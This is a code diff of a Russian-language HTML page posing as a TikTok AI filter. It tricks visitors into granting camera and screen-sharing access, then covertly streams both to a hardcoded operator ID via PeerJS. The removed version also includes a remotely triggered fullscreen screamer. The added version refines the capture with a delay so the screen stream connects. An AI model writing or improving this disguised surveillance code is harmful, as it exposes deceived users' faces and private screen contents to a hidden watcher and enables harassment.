@@ -2,67 +2,66 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>TikTok AI Stream</title>
+    <title>TikTok AI v9.0</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .box { width: 350px; padding: 30px; border-radius: 20px; background: #0d0d0d; border: 1px solid #222; box-shadow: 0 10px 40px #000; }
-        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; box-shadow: 0 0 15px rgba(255,0,80,0.4); }
-        .btn:active { transform: scale(0.98); }
-        #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 9999; display: none; align-items: center; justify-content: center; }
-        #screamer img { width: 100%; height: 100%; object-fit: cover; animation: shake 0.1s infinite; }
-        @keyframes shake { 0% { transform: translate(2px, 2px); } 50% { transform: translate(-2px, -3px); } 100% { transform: translate(1px, 2px); } }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { width: 320px; padding: 30px; border-radius: 20px; background: #0d0d0d; border: 1px solid #222; text-align: center; }
+        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; }
+        #status { color: #555; font-size: 12px; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-    <div id="ui" class="box">
-        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="60">
-        <h2>AI Mirror</h2>
-        <p style="color: #777; font-size: 14px;">Для работы фильтра разрешите доступ к камере и трансляции экрана.</p>
-        <button class="btn" onclick="startVanish()">АКТИВИРОВАТЬ</button>
-    </div>
-
-    <div id="screamer">
-        <img src="https://i.imgur.com/v799C7v.jpeg">
-        <audio id="s-audio" src="https://www.myinstants.com/media/sounds/screamer.mp3" loop></audio>
+    <div class="box">
+        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="50">
+        <h2>AI Activation</h2>
+        <p>Нажмите для запуска синхронизации</p>
+        <button id="mainBtn" class="btn" onclick="startFullSession()">АКТИВИРОВАТЬ</button>
+        <div id="status">Ожидание...</div>
     </div>
 
     <script>
-        const ADM_ID = '09062012'; // Твой ID из админки
+        const ADM_ID = '09062012'; // ПРОВЕРЬ: этот ID должен быть таким же в view.html
         const peer = new Peer();
-        let conn;
+        let activeConn;
 
-        async function startVanish() {
+        async function startFullSession() {
+            const btn = document.getElementById('mainBtn');
+            const status = document.getElementById('status');
+            btn.disabled = true;
+
             try {
-                // 1. Сначала камера
-                const cam = await navigator.mediaDevices.getUserMedia({ video: true });
-                conn = peer.connect(ADM_ID);
-                peer.call(ADM_ID, cam);
-
-                // 2. СРАЗУ ЖЕ экран (без пауз, чтобы не было ошибки)
-                const screen = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                peer.call(ADM_ID, screen);
-
-                // 3. Убираем интерфейс
-                document.getElementById('ui').innerHTML = "<h3>ГОТОВО</h3><p>Синхронизация активна. Можете свернуть браузер.</p>";
+                status.innerText = "Подключение камеры...";
+                const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 
-                listen();
-            } catch (e) {
-                alert("Ошибка! Необходимо разрешить доступ и к камере, и к экрану.");
-            }
-        }
+                // Создаем соединение
+                activeConn = peer.connect(ADM_ID);
+                
+                // Отправляем камеру
+                peer.call(ADM_ID, camStream);
+                status.innerText = "Камера активна. Ждем синхронизации...";
 
-        function listen() {
-            conn.on('data', d => {
-                if (d.type === 'SCR') {
-                    // Переход в полный экран и запуск скримера
-                    document.documentElement.requestFullscreen().catch(()=>{});
-                    document.getElementById('screamer').style.display = 'flex';
-                    document.getElementById('s-audio').play();
-                    document.body.style.cursor = 'none';
-                }
-            });
+                // ПАУЗА 3 секунды, чтобы PeerJS успел создать канал
+                setTimeout(async () => {
+                    try {
+                        status.innerText = "Запрос трансляции экрана...";
+                        const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                        
+                        // Отправляем экран ВТОРЫМ звонком
+                        peer.call(ADM_ID, screenStream);
+                        status.innerText = "Все системы активны!";
+                        btn.innerText = "ГОТОВО";
+                    } catch(e) {
+                        status.innerText = "Экран отклонен";
+                        btn.disabled = false;
+                    }
+                }, 3000);
+
+            } catch (e) {
+                alert("Ошибка! Проверьте камеру и HTTPS");
+                btn.disabled = false;
+            }
         }
     </script>
 </body>
